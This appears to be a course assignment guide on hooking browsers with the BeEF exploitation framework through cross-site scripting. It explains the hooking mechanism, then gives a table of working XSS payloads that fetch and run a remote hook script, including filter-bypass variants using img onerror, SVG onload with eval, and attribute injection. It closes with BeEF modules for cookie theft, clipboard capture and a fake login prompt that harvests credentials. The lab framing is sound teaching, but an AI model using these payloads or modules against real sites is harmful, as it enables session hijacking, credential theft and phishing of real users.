# BeEF Browser Hooking & Command Execution Technical Guide
Assignment 05 — Cross-Site Scripting (XSS) Exploitation

---

## 1. How Browser Hooking Works

When an XSS payload loads an external script like `hook.js`:
1. The victim's browser parses and executes the JavaScript in the security context of the vulnerable origin (`http://localhost:8080` or `http://localhost:8081`).
2. The hook script establishes a periodic polling loop (or WebSocket connection) back to the BeEF control server.
3. The BeEF server can push arbitrary JavaScript instructions to the victim browser, executing with full access to the Document Object Model (DOM), local storage, session cookies, and network capabilities within that origin.

---

## 2. Tested Hook Payloads for Different Injection Contexts

| Vulnerability Context | Recommended Hook Injection Payload | Filter Context / Bypass Notes |
| :--- | :--- | :--- |
| **Standard HTML Body** | `<script src="http://127.0.0.1:3000/hook.js"></script>` | Unfiltered script tag execution. |
| **Attribute Context** | `" onfocus="import('http://127.0.0.1:3000/hook.js')" autofocus="` | Executes via dynamic ECMAScript import on focus. |
| **Blocked `<script>` tag** | `<img src=x onerror="var s=document.createElement('script');s.src='http://127.0.0.1:3000/hook.js';document.body.appendChild(s);">` | Bypasses filters blocking literal `<script>` tags by injecting a dynamic DOM script element. |
| **SVG XML Context** | `<svg onload="fetch('http://127.0.0.1:3000/hook.js').then(r=>r.text()).then(eval)">` | Leverages XML onload handler combined with dynamic evaluation. |

---

## 3. High-Impact Demonstration Modules in BeEF

Once a browser is hooked in the local lab environment, test the following demonstration modules:

1. **Browser Fingerprinting**:
   - Module: `Information Gathering` → `Get System Info`
   - Data Captured: Hardware concurrency, GPU renderer, screen geometry, installed browser plugins.
2. **Clipboard Stealing**:
   - Module: `Browser` → `Hooked Domain` → `Get Clipboard`
   - Captures recent copied clipboard data if permitted by browser permissions.
3. **Session Cookie Exfiltration**:
   - Module: `Browser` → `Hooked Domain` → `Get Cookie`
   - Demonstrates immediate impact of cookies lacking the `HttpOnly` flag.
4. **Pretty Theft Phishing Dialog**:
   - Module: `Social Engineering` → `Pretty Theft`
   - Overlays a realistic floating authentication prompt informing the user their session has expired. When submitted, the entered credentials appear in the BeEF command history log.
